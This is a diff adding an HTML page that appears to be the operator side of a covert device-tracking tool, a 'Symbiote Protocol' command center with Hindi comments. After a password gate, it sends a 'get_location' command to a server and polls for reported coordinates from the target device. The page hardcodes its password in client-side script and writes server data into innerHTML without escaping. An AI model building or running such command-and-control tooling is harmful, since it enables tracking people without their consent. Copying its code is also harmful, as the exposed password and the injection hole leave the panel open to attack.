@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control Panel</title>
+    
+    <!-- ================================== -->
+    <!-- ========= CSS का हिस्सा ========= -->
+    <!-- ================================== -->
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1a1a1a;
+            color: #00ff00;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* --- Login Screen Styles --- */
+        #login-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+        }
+        #login-box {
+            padding: 30px;
+            border: 1px solid #00ff00;
+            background-color: #111;
+        }
+        #password-input {
+            background-color: #333;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            font-size: 16px;
+        }
+        #login-button {
+            background-color: #00ff00;
+            border: none;
+            color: #1a1a1a;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        #login-error {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* --- Dashboard Styles --- */
+        #dashboard {
+            display: none; /* Initially hidden */
+        }
+
+        h1, h2 {
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 10px;
+        }
+
+        .command-section button {
+            background-color: #333;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 15px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .command-section button:hover {
+            background-color: #00ff00;
+            color: #1a1a1a;
+        }
+
+        #status-log {
+            margin-top: 20px;
+            border: 1px solid #555;
+            padding: 10px;
+            height: 100px;
+            overflow-y: scroll;
+            background-color: #111;
+        }
+        
+        #data-display {
+            margin-top: 20px;
+            border: 1px solid #555;
+            padding: 10px;
+            height: 400px;
+            overflow-y: scroll;
+            background-color: #111;
+        }
+
+        .data-item {
+            border-bottom: 1px dashed #333;
+            padding: 8px;
+            margin-bottom: 8px;
+        }
+        .data-item .type {
+            font-weight: bold;
+        }
+        .data-item .timestamp {
+            font-size: 0.8em;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================ -->
+    <!-- ========= LOGIN SCREEN का हिस्सा =========== -->
+    <!-- ============================================ -->
+    <div id="login-container">
+        <div id="login-box">
+            <h2>Enter Access Code</h2>
+            <input type="password" id="password-input" placeholder="Password...">
+            <button id="login-button">Login</button>
+            <p id="login-error">Incorrect Password</p>
+        </div>
+    </div>
+
+
+    <!-- ============================================ -->
+    <!-- ========= DASHBOARD का हिस्सा ============== -->
+    <!-- ============================================ -->
+    <div id="dashboard">
+        <h1>> Symbiote Protocol // Command Center</h1>
+
+        <div class="command-section">
+            <h2>> Commands</h2>
+            <button id="getLocationBtn">Execute: Get_Location</button>
+            <!-- भविष्य के कमांड के लिए बटन यहाँ जोड़ें -->
+        </div>
+
+        <div>
+            <h2>> System Log</h2>
+            <div id="status-log"></div>
+        </div>
+        
+        <div>
+            <h2>> Received Data</h2>
+            <div id="data-display"></div>
+        </div>
+    </div>
+
+
+    <!-- ====================================== -->
+    <!-- ========= JAVASCRIPT का हिस्सा ========= -->
+    <!-- ====================================== -->
+    <script>
+        // ===============================================
+        //  STEP 0: ज़रूरी चीजों को तैयार रखना
+        // ===============================================
+
+        // !!! अपना गुप्त पासवर्ड यहाँ सेट करें !!!
+        const ADMIN_PASSWORD = "your_secret_password_123";
+
+        // Login elements
+        const loginContainer = document.getElementById('login-container');
+        const passwordInput = document.getElementById('password-input');
+        const loginButton = document.getElementById('login-button');
+        const loginError = document.getElementById('login-error');
+
+        // Dashboard elements
+        const dashboard = document.getElementById('dashboard');
+        const getLocationBtn = document.getElementById('getLocationBtn');
+        const statusLog = document.getElementById('status-log');
+        const dataDisplay = document.getElementById('data-display');
+        
+        let displayedDataCount = 0; // ट्रैक रखें कि कितना डेटा दिखाया जा चुका है
+
+        // ===============================================
+        //  STEP 1: लॉगिन को संभालना
+        // ===============================================
+        loginButton.addEventListener('click', handleLogin);
+        passwordInput.addEventListener('keyup', (event) => {
+            if (event.key === 'Enter') {
+                handleLogin();
+            }
+        });
+
+        function handleLogin() {
+            if (passwordInput.value === ADMIN_PASSWORD) {
+                loginContainer.style.display = 'none';
+                dashboard.style.display = 'block';
+                logStatus('Access granted. Welcome.');
+                // डेटा लाना शुरू करें
+                startFetchingData();
+            } else {
+                loginError.style.display = 'block';
+            }
+        }
+        
+        // ===============================================
+        //  STEP 2: कमांड भेजना
+        // ===============================================
+        getLocationBtn.addEventListener('click', () => {
+            sendCommand({ command: 'get_location' });
+        });
+        
+        async function sendCommand(commandObject) {
+            logStatus(`Sending command: ${commandObject.command}...`);
+            try {
+                const response = await fetch('/send-command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(commandObject)
+                });
+                const result = await response.json();
+
+                if (response.ok) {
+                    logStatus('Command sent successfully.');
+                } else {
+                    logStatus(`Error: ${result.message}`);
+                }
+            } catch (error) {
+                logStatus('Network error. Failed to send command.');
+                console.error('Send command error:', error);
+            }
+        }
+
+        // ===============================================
+        //  STEP 3: सर्वर से डेटा प्राप्त करना और दिखाना
+        // ===============================================
+        function startFetchingData() {
+            // हर 5 सेकंड में नई जानकारी के लिए सर्वर से पूछें
+            setInterval(fetchData, 5000);
+            fetchData(); // तुरंत पहली बार भी पूछें
+        }
+
+        async function fetchData() {
+            try {
+                const response = await fetch('/get-reported-data');
+                const data = await response.json();
+                
+                // केवल नया डेटा दिखाएं
+                if (data.length > displayedDataCount) {
+                    const newData = data.slice(displayedDataCount);
+                    displayData(newData);
+                    displayedDataCount = data.length;
+                }
+                
+            } catch (error) {
+                console.error('Fetch data error:', error);
+                logStatus('Error fetching data from server.');
+            }
+        }
+
+        function displayData(newDataArray) {
+            newDataArray.forEach(item => {
+                const itemDiv = document.createElement('div');
+                itemDiv.className = 'data-item';
+
+                let content = `
+                    <span class="timestamp">[${new Date(item.timestamp).toLocaleString()}]</span><br>
+                    <span class="type">${item.type.toUpperCase()}:</span>
+                `;
+
+                if (item.type === 'location') {
+                    content += ` Lat: ${item.latitude}, Lon: ${item.longitude} (Accuracy: ${item.accuracy}m)`;
+                } else {
+                    content += ` ${item.message || JSON.stringify(item)}`;
+                }
+
+                itemDiv.innerHTML = content;
+                dataDisplay.prepend(itemDiv); // नया डेटा सबसे ऊपर दिखाएं
+            });
+        }
+        
+        // ===============================================
+        //  HELPER: लॉग में संदेश दिखाना
+        // ===============================================
+        function logStatus(message) {
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.textContent = `[${time}] ${message}`;
+            statusLog.prepend(logEntry); // नया लॉग सबसे ऊपर दिखाएं
+        }
+
+    </script>
+</body>
+</html>
